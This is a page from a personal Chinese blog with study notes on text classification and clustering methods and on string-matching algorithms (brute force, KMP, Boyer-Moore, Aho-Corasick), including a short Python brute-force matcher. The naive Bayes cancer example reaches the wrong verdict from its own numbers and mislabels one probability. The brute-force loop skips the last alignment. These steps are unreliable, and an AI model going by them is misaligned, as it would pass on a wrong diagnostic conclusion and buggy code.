              <time title="创建时间：2023-11-29 21:26:10 / 修改时间：21:28:43" itemprop="dateCreated datePublished" datetime="2023-11-29T21:26:10+08:00">2023-11-29</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>1.7k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1>文本分类</h1>
<h1>文本分类和文本聚类的区别</h1>
<p>分类问题：一般是指事先确定好类别，然后将集合中的元素分别划分到相应类别中的问题。</p>
<p>聚类问题：一般是指事先没有确定好类别，而是根据集合中各元素的某些特点而形成的分类，也就是子集。</p>
<h1>文本表示方法</h1>
<h2 id="空间向量模型">空间向量模型</h2>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled.png" alt="Untitled"></p>
<p><strong>也就是用特征构造的向量来表示(N维空间)</strong></p>
<h3 id="将文字转换为坐标值的方法→One-Hot编码">将文字转换为坐标值的方法→One-Hot编码</h3>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%201.png" alt="Untitled"></p>
<p>但是语料库太大了，这样表示的话每个向量都巨大无比。</p>
<h3 id="Bags-of-Words-BOW，词袋模型">Bags-of-Words(BOW，词袋模型)</h3>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%202.png" alt="Untitled"></p>
<p><strong>和One-Hot差不多</strong></p>
<p>我们并没有表达单词在原来句子中出现的次序，这也是 Bag-of-Words 模型的缺点之一。</p>
<h2 id="N-Gram模型">N-Gram模型</h2>
<p><a target="_blank" rel="noopener" href="https://www.notion.so">https://www.notion.so</a></p>
<p>可以当成是BOW的改进版，多了个滑窗，也就是相近的两个单词为一个，所以考虑了句子原来的次序。</p>
<h2 id="TF-IDF模型">TF-IDF模型</h2>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%203.png" alt="Untitled"></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%204.png" alt="Untitled"></p>
<p><strong>看看例题</strong></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%205.png" alt="Untitled"></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%206.png" alt="Untitled"></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%207.png" alt="Untitled"></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%208.png" alt="Untitled"></p>
<h1>文本预处理-分词</h1>
<p>这一步就是为了获取文本中的词语信息的。</p>
<p>文本预处理主要包括 分词、去除停用词和特殊符号。</p>
<p>英语的基本单位是单词，可以根据空格和标点符号进行分词，然后提取词根和词干。</p>
<p>中文的基本单位是字，需要一些算法来进行分词。</p>
<h3 id="基于字符串的分词方法">基于字符串的分词方法</h3>
<p>该方法就是将待分词的字符串从头到尾开始切分出字串，再与现存几乎所有的中文词语的词典匹配，若匹配成功，则字串是一个词语。</p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%209.png" alt="Untitled"></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2010.png" alt="Untitled"></p>
<h3 id="基于统计及机器学习的分词方法">基于统计及机器学习的分词方法</h3>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2011.png" alt="Untitled"></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2012.png" alt="Untitled"></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2013.png" alt="Untitled"></p>
<h3 id="jieba分词">jieba分词</h3>
<p>jieba库有三种分词模式：</p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2014.png" alt="Untitled"></p>
<p>原理是这个：</p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2015.png" alt="Untitled"></p>
<p>本质就是，构造DAG图。</p>
<p>然后采取动态规划的策略，查找最大概率的路径(这个是个切分组合)</p>
<p>对于未登录词，用HMM模型来处理。</p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2016.png" alt="Untitled"></p>
<h2 id="特征提取">特征提取</h2>
<p>如果以词为特征的话，特征向量的维度可能过大，学习算法无法处理这个高的维度。</p>
<p>所以需要特征提取。</p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2017.png" alt="Untitled"></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2018.png" alt="Untitled"></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2019.png" alt="Untitled"></p>
<p>了解就行(</p>
<h1>分类方法</h1>
<h2 id="基于决策树的分类">基于决策树的分类</h2>
<p>决策树中一个重要的定义就是<strong>信息熵。</strong></p>
<h3 id="熵">熵</h3>
<p>熵在信息论中被用来度量信息量，熵越大，所含的有用信息越多。其不确定性就越大。熵越少，确定性越大。</p>
<p>在决策树中，用熵来表示样本集的不纯度，如果某个样本集合中只有一个类别，其确定性最高，熵为0。</p>
<p>反之，熵越大，越不确定，表示样本集中的分类越多样。</p>
<p>所以信息量的大小，不是数据集的大小，而是不确定性。</p>
<h3 id="计算信息熵">计算信息熵</h3>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2020.png" alt="Untitled"></p>
<h3 id="信息增益">信息增益</h3>
<p>信息增益：熵-条件熵。表示在一个条件下，信息不确定性减少的程度。</p>
<h3 id="计算信息增益">计算信息增益</h3>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2021.png" alt="Untitled"></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2022.png" alt="Untitled"></p>
<h3 id="信息增益率">信息增益率</h3>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2023.png" alt="Untitled"></p>
<p>懂了！</p>
<p>决策树是一棵树，包含所有可能的分支，所以初始化需要训练。</p>
<p>计算好信息增益之后，将值比较大的放在前面(树的前面)，因为信息增益是表明哪个能够显著减少不确定性的。这样子构建一棵树，每次走的时候按照信息增益判断就行了，目的是最大程度减少不确定性。</p>
<p><strong>信息增益率</strong></p>
<p>假如某个条件极其严格，比如某个同学提前知道了所有选题的答案，那么将选题的序号作为条件，不存在任何不确定性，所以可以得到最大的信息增益。但是这个条件是没有意义的，假设老师换一份考卷答案就全部作废了。</p>
<p>信息增益率在信息增益的基础上增加了惩罚项，惩罚项是特征的固有值，是避免上述情况而设计的。</p>
<h2 id="基于贝叶斯的分类">基于贝叶斯的分类</h2>
<p>用好这条公式</p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2024.png" alt="Untitled"></p>
<p>因为比较的时候P(X)是一致的，所以关注P(X|H)*P(H)，也就是概率计算。</p>
<p>举个例子：</p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2025.png" alt="Untitled"></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2026.png" alt="Untitled"></p>
<p>H0为癌症，H1无癌症</p>
<p>P(H0) = 0.008，P(H1) = 0.992</p>
<p>P(+|H0) = 0.98，P(-|H0) = 0.02</p>
<p>P(+|H1) = 0.03，P(-|H0) = 0.97</p>
<p>所以式子1为0.98 * 0.008 = 0.00784</p>
<p>式子2为0.03 * 0.992 = 0.029759999999999998</p>
<p>所以应该判定为患有癌症。</p>
<p>tips：当分子出现0的时候，请实用拉普拉斯平滑处理，对每一个特征都+1，分母加上特征量N</p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2027.png" alt="Untitled"></p>
<h2 id="支持向量机SVM">支持向量机SVM</h2>
<h3 id="基本思想和原理">基本思想和原理</h3>
<p>SVM是一种监督性学习，对数据进行二元分类的广义线性分类器。</p>
<p><strong>决策边界是对学习样本求解的最大边距超平面。</strong></p>
<p>SVM使用<strong>损失函数计算经验风险</strong>并加入了<strong>正则化项以优化结构风险</strong>，是一个具有稀疏性核稳健性的分类器。</p>
<p><strong>实际上一句话概括就是，SVM是最大间隔线性分类器。通过核函数将数据从低纬映射到高纬，在高维上实现数据可分。</strong></p>
<p>有一些公式：</p>
<p>M = margin Width = 2 / iroot(w.w, 2)，这里是w点乘w向量</p>
<p>w.w’ = w1 * w’1 + w2 * w’2 + w3 * w’3 + … + wn * w’n</p>
<p>计算最小w需要使用 梯度下降/退火算法等。这里不在研究范围之内。</p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2028.png" alt="Untitled"></p>
<h3 id="核函数">核函数</h3>
<p>实际上就是低维数据到高维数据的映射</p>
<p><a target="_blank" rel="noopener" href="https://www.notion.so">https://www.notion.so</a></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2029.png" alt="Untitled"></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2030.png" alt="Untitled"></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2031.png" alt="Untitled"></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2032.png" alt="Untitled"></p>
<p>不同的核函数会导致不同的SVM算法</p>
<h2 id="KNN-K-最近邻分类">KNN K-最近邻分类</h2>
<h3 id="基本思想和原理-2">基本思想和原理</h3>
<p>距离公式：欧氏距离</p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2033.png" alt="Untitled"></p>
<p><strong>曼哈顿距离</strong></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2034.png" alt="Untitled"></p>
<p><strong>闵科夫斯基距离</strong></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2035.png" alt="Untitled"></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2036.png" alt="Untitled"></p>
<p>训练阶段主要是通过计算样本之间的相似度来构建一个特征空间模型，并保存训练样本数据。</p>
<p>在KNN算法中，没有像其他机器学习算法那样需要学习和调整参数的过程。KNN算法的主要任务是在预测阶段根据新样本与训练样本之间的相似性，通过计算最近邻的投票或平均值来进行分类或回归预测。</p>
<h2 id="k-means算法-聚类-→-基于划分的方法">k-means算法(聚类) → 基于划分的方法</h2>
<p>这里的k是质心数，也就是有多少个类。</p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2037.png" alt="Untitled"></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2038.png" alt="Untitled"></p>
<h2 id="DBSCAN-→-基于密度的方法">DBSCAN → 基于密度的方法</h2>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2039.png" alt="Untitled"></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/123.jpg" alt="123.jpg"></p>
<p><strong>DBSCAN算法将数据点分为三类：</strong></p>
<p><strong>1、核心点：在半径Eps内含有超过MinPts数目的点。</strong></p>
<p><strong>2、边界点：在半径Eps内点的数量小于MinPts，但是落在核心点的邻域内的点</strong>。</p>
<p>3、噪音点：既不是核心点也不是边界点的点。</p>
<p>两个参数：半径r和指定范围内的数目MinPts</p>
<h2 id="基于层次的聚类">基于层次的聚类</h2>
<h3 id="凝聚法">凝聚法</h3>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2040.png" alt="Untitled"></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2041.png" alt="Untitled"></p>
<h3 id="分裂法">分裂法</h3>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2042.png" alt="Untitled"></p>
<p><img src="./images/%E6%96%87%E6%9C%AC%E5%88%86%E7%B1%BB%202645345d7af94c369167f9f7a8b4bbae/Untitled%2043.png" alt="Untitled"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/27/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%E7%AE%97%E6%B3%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.png">
      <meta itemprop="name" content="hkbin">
      <meta itemprop="description" content="hkbin hkbin hkbin">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hkbin的小博客~">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/27/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%E7%AE%97%E6%B3%95/" class="post-title-link" itemprop="url">字符串匹配算法</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-11-27 21:58:29" itemprop="dateCreated datePublished" datetime="2023-11-27T21:58:29+08:00">2023-11-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-11-29 21:25:53" itemprop="dateModified" datetime="2023-11-29T21:25:53+08:00">2023-11-29</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1>字符串匹配</h1>
<h1>字符串匹配(模式匹配)的分类</h1>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%201.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%202.png" alt="Untitled"></p>
<h1>BF算法(brute-force)</h1>
<h2 id="主要思想：">主要思想：</h2>
<p>从左往右，依次比较，每次移动一个字符位置。比较方向可以任意选定。无预处理阶段。</p>
<p>也就是暴力比较。</p>
<p>时间复杂度为O(n*m)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">context = <span class="string">&quot;GCACTGCAGCACAGCAGCAGTACG&quot;</span></span><br><span class="line">model = <span class="string">&quot;GCAGCAG&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">BP</span>(<span class="params">context, model</span>):</span><br><span class="line">    model_length = <span class="built_in">len</span>(model)</span><br><span class="line">    context_length = <span class="built_in">len</span>(context)</span><br><span class="line">    error = <span class="number">0</span></span><br><span class="line">    offset = context_length - model_length</span><br><span class="line">    <span class="keyword">if</span> offset &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, offset):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(model_length):</span><br><span class="line">            error += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> context[i+j] != model[j]:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> j == model_length-<span class="number">1</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;error: &quot;</span>, error)</span><br><span class="line">                    <span class="keyword">return</span> i</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;error: &quot;</span>, error)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">result = BP(context, model)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
<h1>KMP算法</h1>
<h2 id="kmp算法核心思想：控制回溯尺度-不回溯思想">kmp算法核心思想：控制回溯尺度(不回溯思想)</h2>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%203.png" alt="Untitled"></p>
<p>如此例子所示，当e和d发生失配的时候，BF算法是将已经匹配的字符全部回溯，从第一个重新开始匹配。</p>
<p>但是kmp则根据最长公共前后缀，此处为前缀ab和后缀ab，会将前缀移动到后缀处，控制了回溯尺度(也就相当于跳的更远了些。</p>
<h2 id="显然关键在于求解next数组">显然关键在于求解next数组</h2>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%204.png" alt="Untitled"></p>
<p>例子：</p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%205.png" alt="Untitled"></p>
<h2 id="nextval数组">nextval数组</h2>
<p>nextval数组是next数组的修正版，主要解决了模式串中大量连续重复连续的字符，减少了主串的无用比较次数。</p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%206.png" alt="Untitled"></p>
<h1>BM算法</h1>
<p>BM算法是另一种能够充分利用模式串特征，尽可能排除多的无效字符匹配的单模式匹配算法。</p>
<h2 id="主要思想：-2">主要思想：</h2>
<p>算法从正文左端开始于模式串对其并向右扫描，对齐后从<strong>模式最右端开始从右向左</strong>进行字符匹配。在发生不匹配的时候，用两个预先计算的函数**坏字符(bad character)<strong>和</strong>好后缀(good suffix)**来确定模式串移动的距离。</p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%207.png" alt="Untitled"></p>
<h2 id="坏字符原则">坏字符原则</h2>
<p>坏字符原则1：模式串中不存在对应的坏字符：直接右移模式串到坏字符右侧。</p>
<p>坏字符原则2：模式串中存在对应的坏字符，找到最右的对应字符。</p>
<p>原则2a：失配位置在该字符右侧时：让模式串右移，使得最右的对应字符与坏字符相对。</p>
<p>原则2b：失配位置在该字符左侧时：模式串右移一步。</p>
<p>（移动过程中，模式串不能相对于文本串走回头路）</p>
<p>但是会出现<strong>字符风暴</strong>问题：</p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%208.png" alt="Untitled"></p>
<h2 id="好后缀原则">好后缀原则</h2>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%209.png" alt="Untitled"></p>
<p>好后缀原则1：模式串中有字串和好后缀完全匹配，则将最靠右的那个字串移动到好后缀的位置继续匹配。</p>
<p><strong>注意：bmGs数组在找和好后缀相同的子串的时候，一般还需要往左多看一个字符，确保两个子串前一个字符不同，才算找到相同字串。</strong></p>
<p>好后缀原则2：如果不存在和好后缀完全匹配的字串，但在好后缀中存在某个最长后缀，使得模式的整个前缀与这个后缀匹配，将这个最长后缀与前缀对齐。(和KMP类似)</p>
<p>好后缀原则3：如果完全不存在和好后缀满足以上两个原则的字串，则右移整个模式串。</p>
<h2 id="坏字符数组bmBc数组的构造">坏字符数组bmBc数组的构造</h2>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2010.png" alt="Untitled"></p>
<h2 id="好后缀数组bmGs数组的构造">好后缀数组bmGs数组的构造</h2>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2011.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2012.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2013.png" alt="Untitled"></p>
<p>suffix数组：</p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2014.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2015.png" alt="Untitled"></p>
<h1>单模式匹配算法复杂度分析</h1>
<p>BP：<strong>O(n*m)</strong></p>
<p>KMP：</p>
<p><strong>KMP算法的时间复杂度为O(m+n)，其中m是模式串的长度，n是文本串的长度。</strong></p>
<p><strong>具体来说，KMP算法的时间复杂度由两个部分构成：</strong></p>
<p><strong>1. 构造前缀表（也就是next数组）的时间复杂度为O(m)，因为需要对模式串进行前缀匹配。</strong></p>
<p><strong>2. 匹配的时间复杂度为O(n)，因为需要对文本串的每个字符都进行一次匹配操作。</strong></p>
<p><strong>这两个部分的时间复杂度相加即可得到KMP算法的总体时间复杂度为O(m+n)。</strong></p>
<p>BM：</p>
<p><strong>时间复杂度以上BM算法是个初级版本。这个版本，在极端情况下，预处理计算suffix数组、prefix数组的性能会比较差。比如模式串是aaaaaaa这种包含很多重复的字符的模式串，预处理的时间复杂度就是O（m^2）。如何优化这种极端情况下的时间复杂度退化，以后再找空研究。实际上，BM算法的时间复杂度分析起来是非常复杂，论文&quot;A new proof of the linearity of the Boyer-Moore string searching algorithm&quot;证明了在最坏情况下，BM算法的比较次数上限是5n。论文&quot;Tight bounds on the complexity of the Boyer-<br>
Moore string matching algorithm&quot;证明了在最坏情况下，BM算法的比较次数上限是3n。</strong></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2016.png" alt="Untitled"></p>
<h2 id="AC算法—有限自动机的多模式匹配算法">AC算法—有限自动机的多模式匹配算法</h2>
<p>形象地说就是kmp+trie树。</p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2017.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2018.png" alt="Untitled"></p>
<p>这里可以不看ppt了，因为实验实现的AC自动机是纯自己写的。这里复习一下。</p>
<p>书面上主要有三个函数，转向函数g，失效函数f，输出函数output，如图所示：</p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2019.png" alt="Untitled"></p>
<h3 id="转向函数g的构造">转向函数g的构造</h3>
<p>按照字典树trie的方式来构造即可，一个一个单词插入，字典树的插入和查询复杂度为O(L)，L为字符串长度。</p>
<p>从根节点开始，如果没有通道，则fork出一个分支，比如存储she的时候，根节点没有到s的通道，则fork出一条新的来。</p>
<h3 id="失效函数f的构造">失效函数f的构造</h3>
<p>一个递推公式：</p>
<p>f[i] = f[pre] if f[pre]→next ≠ i else f[pre]→next</p>
<p>哈哈有点复杂，就是先看f[pre]，然后看有无路径，有就指向那里，没有就用f[pre]就行了。</p>
<p>比如这里的5，构造它的f，先看f[4]，f[4]=1，所以看1通往哪里，发现有e的通道，所以直接指向2就行了。</p>
<h3 id="失效函数output的构造">失效函数output的构造</h3>
<p>这个比较简单也就是当跑到这个节点的时候，应该输出什么东西。</p>
<p>比如这里到了5节点应该输入she，然后看看f[5] = f[2]，恰好2也应该输出，所以就把he也加上去。</p>
<h3 id="AC算法的缺点—内存占用问题">AC算法的缺点—内存占用问题</h3>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2020.png" alt="Untitled"></p>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2021.png" alt="Untitled"></p>
<p>优化方法：</p>
<h3 id="行压缩方法">行压缩方法</h3>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2022.png" alt="Untitled"></p>
<p>也就是用链表啦，方便实用。而且简单。</p>
<h3 id="位图方法">位图方法</h3>
<p><img src="./images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%209fa566235fa34056b6cd28408f51d444/Untitled%2023.png" alt="Untitled"></p>
